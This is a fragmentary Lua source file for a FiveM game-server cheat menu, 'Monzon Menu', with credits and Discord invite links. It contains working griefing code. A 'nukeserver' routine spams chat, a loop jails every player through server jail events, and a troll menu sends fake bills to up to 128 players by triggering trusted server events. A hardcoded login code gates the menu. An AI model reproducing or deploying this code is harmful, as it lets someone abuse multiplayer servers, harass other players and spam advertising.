                ...
                Citizen.CreateThread(
                    function()
                        ...
                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                'oFlaqme#1149 Monzon Menu',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. 'https://discord.gg/d76GGdp'
                            )
                        end
                        for i = 0, 256 do
                            TriggerServerEvent(
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                'oFlaqme#1149 ^1M^2o^3n^4z^5o^6n https://discord.gg/d76GGdp',
                                43161337
                            )
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"^1M^2o^3n^4z^5o^6n Made by ^1E^2x^3i^4a ^1C^2o^3m^4m^5u^6n^7i^8t^9y ~ ^7Server was just destroyed by Monzon Menu Made by Exia https://discord.gg/QZ8hG2X")
        end
        ...
        while true do
			...
			if chatspam then
                TriggerServerEvent(
                    ...
                    'oFlaqme#1149',
                    {0, 0x99, 255},
                    '/ooc ^1M^2o^3n^4z^5o^6n Made by ^1E^2x^3i^4a ^1C^2o^3m^4m^5u^6n^7i^8t^9y: Server was just destroyed by Monzon Menu Made by Exia https://discord.gg/d76GGdp'
                )
                TriggerServerEvent('_chat:messageEntered', 'oFlaqme#1149', {0, 0x99, 255}, '/ooc ^1M^2o^3n^4z^5o^6n Made by ^1E^2x^3i^4a ^1C^2o^3m^4m^5u^6n^7i^8t^9y: Server was just destroyed by Monzon Menu Made by Exia https://discord.gg/d76GGdp')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "^1M^2o^3n^4z^5o^6n Made by ^1E^2x^3i^4a ^1C^2o^3m^4m^5u^6n^7i^8t^9y: https://discord.gg/d76GGdp")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "^1M^2o^3n^4z^5o^6n Made by ^1E^2x^3i^4a ^1C^2o^3m^4m^5u^6n^7i^8t^9y: https://discord.gg/d76GGdp")
					end
				end
...
Citizen.CreateThread(
    function()
        ...
        Plane.CreateMenu("MainMenu", "Monzon Menu")
        ...
        while Enabled do
            if Plane.IsMenuOpened("MainMenu") then
                drawNotification("~h~~b~Monzon ~s~Menu")
                drawNotification("~h~~s~Made by ~b~oFlaqme#1149")
            ...
            elseif Plane.IsMenuOpened("TrollMenu") then
				...
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Monzon menu https://discord.gg/d76GGdp", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Monzon menu https://discord.gg/d76GGdp", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Monzon menu https://discord.gg/d76GGdp", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Monzon menu https://discord.gg/d76GGdp", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Monzon menu https://discord.gg/d76GGdp", "6969696969")
        ...
        drawNotification(
            "You are not sitting in a vehicle mate"
                ...
                elseif Plane.Button("Spawn a vehicle") then
					...
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
						SetVehicleNumberPlateText(playerVeh, "Monzon")
                    else
            ...
            elseif Plane.IsMenuOpened("OnlinePlayersMenu") then
				...
				elseif Plane.IsMenuOpened("Credits") then
				    if Plane.Button("∑~r~~h~oFlaqme#11491 - Owner / Developer") then
				end
				Plane.Display()
            ...
            elseif IsDisabledControlPressed(0, 162) then
                if logged then
                    ...
                    if temp == "Monzon" then
                        drawNotification("~g~Login Succesfull, Good luck modding!")
                        logged = true
                        Plane.OpenMenu("MainMenu")
                    else
                        drawNotification("~r~Wrong Code Homie")
                    end
                end
            end
